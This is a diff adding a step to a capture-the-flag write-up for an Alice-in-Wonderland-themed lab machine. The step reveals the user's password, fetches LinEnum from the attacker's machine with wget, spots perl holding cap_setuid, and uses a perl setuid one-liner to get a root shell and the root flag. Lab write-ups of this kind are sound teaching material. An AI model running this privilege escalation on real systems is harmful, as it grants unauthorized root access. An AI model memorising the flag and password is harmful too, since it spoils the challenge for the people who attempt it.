@@ -110,3 +110,11 @@ The Mad Hatter will be here soon.
 Probably by Sat, 08 Jan 2022 21:46:21 +0000
 Ask very nicely, and I will give you some tea while you wait for him
 ```
+
+8. Navigate to hatter's directory and we see a password file. Cat it out and we find that hatter's password is `WhyIsARavenLikeAWritingDesk?`. Let's do some enumeration on this machine with LinEnum. First, clone LinEnum's repository onto your host machine with `git clone https://github.com/rebootuser/LinEnum.git`. Then open a python server on LinEnum's directory with `python3 -m http.server`. Now download the script onto the target machine with wget. Make it executable with `chmod +x LinEnum.sh` and run it. Look through the output and we see that `/usr/bin/perl` has the `CAP_SETUID` capability set. Using a command `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'` provided by [GTFOBin](https://gtfobins.github.io/gtfobins/perl/), we can open another shell as root. Now simply go back to alice's directory and print out root.txt to get `thm{Twinkle, twinkle, little bat! How I wonder what you're at!}`
+```
+[00;31m[+] Files with POSIX capabilities set:[00m
+/usr/bin/perl5.26.1 = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+```
